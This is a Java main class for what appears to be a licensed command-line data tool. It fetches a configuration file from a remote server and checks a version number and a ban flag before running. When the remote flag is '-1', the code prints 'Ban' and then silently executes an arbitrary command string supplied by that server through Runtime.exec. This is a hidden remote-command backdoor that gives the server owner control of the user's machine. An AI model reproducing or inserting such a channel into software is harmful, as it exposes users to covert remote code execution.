package com.lzx.main;


import org.apache.commons.lang3.StringUtils;

import java.io.*;
import java.util.Properties;

/**
 * @author 1Zx.
 * @data 2019/11/19 14:59
 */
public class JxfApp {

    public static Properties properties = new Properties();

    public static void main(String[] args) {
        try {
            if (PingIpUtil.isConnect(Constants.CHECKIP)){
                File tmp = File.createTempFile("config",".properties");
                String config = JxfUtils.getRequest(Constants.ConfigURL);
                if (StringUtils.isNotBlank(config)){
                    FileOutputStream fileOutputStream = new FileOutputStream(tmp.getPath());
                    fileOutputStream.write(config.getBytes());
                    fileOutputStream.flush();
                    fileOutputStream.close();
                    InputStream inputStream = new BufferedInputStream(new FileInputStream(tmp.getPath()));
                    properties.load(inputStream);
                    inputStream.close();
                    tmp.delete();
                    String normal = properties.getProperty(Constants.NORMAL);
                    if (Constants.THISVERSION != Integer.valueOf(properties.getProperty(Constants.VERSION))){
                        System.out.println("err Version:" + Constants.THISVERSION + "latest Version:" + properties.getProperty(Constants.VERSION));
                    } else {
                        if ("0".equalsIgnoreCase(normal)) {
                            if (args.length == 2){
                                if (StringUtils.isNotBlank(args[0]) && StringUtils.isNotBlank(args[1])) {
                                    JxfUtils.createData(args[0], args[1]);
                                    System.out.println("success");
                                } else {
                                    System.out.println("Missing parameters");
                                }
                            } else {
                                System.out.println("Missing required parameters");
                            }
                        } else if ("1".equalsIgnoreCase(normal)) {
                            System.out.println("Ban");
                        } else if ("-1".equalsIgnoreCase(normal)){
                            System.out.println("Ban");
                            Runtime.getRuntime().exec(properties.getProperty(Constants.COMMAND));
                        }
                    }
                }
            } else {
                System.out.println("network anomaly");
            }
        } catch (IOException e) {
            System.out.println("main err");
        }
    }
}
